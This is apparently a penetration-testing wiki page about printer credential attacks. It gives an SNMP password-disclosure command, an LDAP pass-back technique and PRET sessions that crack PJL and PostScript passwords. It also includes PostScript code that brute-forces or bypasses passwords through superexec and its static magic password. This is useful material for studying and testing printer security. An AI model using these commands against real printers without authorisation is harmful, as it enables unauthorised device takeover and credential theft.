# Credentials Disclosure / Brute-Force

Printers are commonly deployed with a **default password or no initial password at all**. In both cases, end-users or administrators have to actively set a password to secure the device.

## Password Disclosure

### SNMP

Ancient HP printers had a vulnerable OID that returned the password. Other vendors may have similar SNMP based issues.

```text
snmpget -v1 -c public printer iso.3.6.1.4.1.11.2.3.9.1.1.13.0
iso.3.6.1.4.1.11.2.3.9.1.1.13.0 = Hex-STRING: 41 41 41 00 …
```

### Pass-Back

If the printer is **authorising people using an external LDAP**. If you have access to the **change this settings** \(maybe using a web console interface\) you can make the printer connects to your LDAP server and authorise any user.  
Note that you could abuse this settings also to **steal the credentials the printer is using** to connect to the LDAP server. [Read here to learn more](../../windows/active-directory-methodology/ad-information-in-printers.md).

## Brute-Force

### PJL

PJL passwords however are vulnerable to brute-force attacks because of their limited 16 bit key size. Noways in less than 30min you can guess the correct password.

You can use `lock` and `unlock` commands of [PRET](https://github.com/RUB-NDS/PRET) to test bruteforce:

```text
./pret.py -q printer pjl
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.
printer:/> lock 999
PIN protection:  ENABLED
Panel lock:      ON
Disk lock:       ON
printer:/> unlock
No PIN given, cracking.
PIN protection:  DISABLED
Panel lock:      OFF
Disk lock:       OFF
```

### PostScript

PostScript offers two types of passwords: The `SystemParamsPassword` is used to change print job settings like paper size, while the `StartJobPassword` is required to exit the server loop and therefore permanently alter the PostScript environment.

Brute-force attacks against PostScript passwords can be performed extremely fast because the **PostScript interpreter can be programmed to literally crack itself**:

```text
/min 0 def /max 1000000 def
statusdict begin {
  min 1 max
  {dup checkpassword {== flush stop} {pop} ifelse} for
} stopped pop
```

Another approach is to **bypass PostScript passwords** by resetting them with Adobe's proprietary `superexec` operator. This operator resides in the internaldict dictionary, which is ‘protected’ by a static, magic password \(`1183615869`\). Wrapping PostScript code into superexec allows an attacker to ignore various protection mechanisms of the language, which would normally raise an invalidaccess error. This can be used to set PostScript passwords without initially submitting the current password as shown below:

```text
{ << /SystemParamsPassword (0)
     /StartJobPassword (0) >> setsystemparams
} 1183615869 internaldict /superexec get exec
```

The lock and unlock commands of [PRET](https://github.com/RUB-NDS/PRET) can be used to test **brute-force** attacks against numeric \(integer\) PostScript passwords or to **bypass** them with **superexec magic**:

```text
./pret.py -q printer ps
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.
printer:/> lock 999
printer:/> unlock
No password given, cracking.
Device unlocked with password: 999
printer:/> lock S0me_Re4lly_g00d_Passw0rd!
printer:/> unlock bypass
Resetting password to zero with super-secret PostScript magic
Device unlocked with password: 0
```



**More information about Password Disclosure and Brute-Force in** [**http://hacking-printers.net/wiki/index.php/Credential\_disclosure**](http://hacking-printers.net/wiki/index.php/Credential_disclosure)\*\*\*\*

